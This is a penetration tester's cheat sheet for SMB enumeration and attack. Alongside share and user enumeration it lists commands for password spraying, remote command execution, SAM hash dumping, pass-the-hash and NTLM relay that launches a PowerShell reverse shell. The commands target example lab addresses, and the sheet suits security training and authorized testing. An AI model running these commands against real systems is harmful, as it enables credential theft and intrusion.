# SMB Enumeration

    Enumerate Hostname – nmblookup -A [ip]  
    List Shares  
        smbmap -H [ip/hostname]  
        echo exit | smbclient -L \\\\[ip]  
        nmap --script smb-enum-shares -p 139,445 [ip]  
    Check Null Sessions  
        smbmap -H [ip/hostname]  
        rpcclient -U "" -N [ip]  
        smbclient \\\\[ip]\\[share name]  
    Check for Vulnerabilities – nmap --script smb-vuln* -p 139,445 [ip]  
    Overall Scan – enum4linux -a [ip]  
    Manual Inspection  
        smbver.sh [IP] (port) [Samba]  
        check pcap  


Command |	Description
:---    | :---
smbclient -N -L //10.10.10.1	| Null-session testing against the SMB service.
smbmap -H 10.10.10.1	| Network share enumeration using smbmap.
smbmap -H 10.10.10.1 -r notes |	Recursive network share enumeration using smbmap.
smbmap -H 10.10.10.1 --download "notes\note.txt"	| Download a specific file from the shared folder.
smbmap -H 10.10.10.1 --upload test.txt "notes\test.txt"	| Upload a specific file to the shared folder.
rpcclient -U'%' 10.10.10.1	| Null-session with the rpcclient.
./enum4linux-ng.py 10.10.10.1 -A -C	| Automated enumeratition of the SMB service using enum4linux-ng.
crackmapexec smb 10.10.10.1 -u /tmp/userlist.txt -p 'Company01!'	| Password spraying against different users from a list.
impacket-psexec administrator:'Password123!'@10.10.10.1	| Connect to the SMB service using the impacket-psexec.
crackmapexec smb 10.10.10.1 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec	| Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users	| Enumerating Logged-on users.
crackmapexec smb 10.10.10.1 -u administrator -p 'Password123!' --sam	| Extract hashes from the SAM database.
crackmapexec smb 10.10.10.1 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE	| Use the Pass-The-Hash technique to authenticate on the target host.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.1| 	Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.1 -c 'powershell -e <base64 reverse shell>	| Execute a PowerShell based reverse shell using impacket-ntlmrelayx.



### SMB Enumeration: Hostname

`nmblookup -A 192.168.1.17`  
`nbtscan 192.168.1.17`  
`nmap --script nbstat.nse 192.168.1.17`  
`nbtstat -A 192.168.1.17`  
`ping -a 192.168.1.17`  
`nmap --script smb-os-discovery 192.168.1.17`  


### SMB Enumeration: Share and Null Session

`smbmap -H 192.168.1.40`  - without user  
`smbmap -H 192.168.1.17 -u username -p password` - with user  

`smbclient -L 192.168.1.40`  
`smbclient //192.168.1.40/guest`  
`nmap --script smb-enum-shares -p139,445 192.168.1.17`  
`net view \\192.168.1.17 /All`  
`auxiliary/scanner/smb/smb_enumshares`  
`crackmapexec smb 192.168.1.17 -u 'username' -p 'password' –shares`  
```bash
rpcclient -U "" -N 192.168.1.40  
netshareenum  
netshareenumall  
```
### SMB Enumeration: Vulnerability Scanning

`nmap --script smb-vuln* 192.168.1.16`  


### SMB Enumeration: Users

`auxiliary/scanner/smb/smb_lookupsid`  -  what local users exist in the system  

Impacket: Lookupsid  
Requirements:  
• Domain  
• Username  
• Password/Password Hash  
• Target IP Address   
`python3 lookupsid.py Domain/usernname:password(hash)@192.168.1.17`  

`enum4linux 192.168.1.40`  


